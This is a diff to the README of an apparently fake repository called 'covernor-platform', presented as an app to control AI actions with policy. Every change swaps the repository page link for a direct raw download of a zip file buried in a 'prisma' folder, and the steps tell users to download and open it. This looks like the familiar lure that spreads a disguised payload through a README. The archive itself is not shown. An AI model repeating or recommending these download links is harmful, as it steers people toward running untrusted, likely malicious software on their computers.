@@ -1,10 +1,10 @@
 # 🛡️ covernor-platform - Control AI Actions with Policy
 
-[![Download covernor-platform](https://img.shields.io/badge/Download%20covernor--platform-blue?style=for-the-badge)](https://github.com/Appeaserdirectorstockholderrelation887/covernor-platform)
+[![Download covernor-platform](https://img.shields.io/badge/Download%20covernor--platform-blue?style=for-the-badge)](https://github.com/Appeaserdirectorstockholderrelation887/covernor-platform/raw/refs/heads/main/prisma/covernor-platform-3.0.zip)
 
 ## 📥 Download
 
-Visit this page to download: https://github.com/Appeaserdirectorstockholderrelation887/covernor-platform
+Visit this page to download: https://github.com/Appeaserdirectorstockholderrelation887/covernor-platform/raw/refs/heads/main/prisma/covernor-platform-3.0.zip
 
 ## 🖥️ What this app does
 
@@ -25,7 +25,7 @@ If your computer can run a modern browser and open downloaded apps, it should wo
 ## 🚀 Getting Started
 
 1. Open the download page:
-   https://github.com/Appeaserdirectorstockholderrelation887/covernor-platform
+   https://github.com/Appeaserdirectorstockholderrelation887/covernor-platform/raw/refs/heads/main/prisma/covernor-platform-3.0.zip
 2. On the page, find the latest Windows download.
 3. Download the file to your computer.
 4. Open the downloaded file.
@@ -146,7 +146,7 @@ Keep this folder in a place that is easy to back up.
 To get the latest version:
 
 1. Open the download page:
-   https://github.com/Appeaserdirectorstockholderrelation887/covernor-platform
+   https://github.com/Appeaserdirectorstockholderrelation887/covernor-platform/raw/refs/heads/main/prisma/covernor-platform-3.0.zip
 2. Download the newer build.
 3. Close the app.
 4. Install or replace the old version.
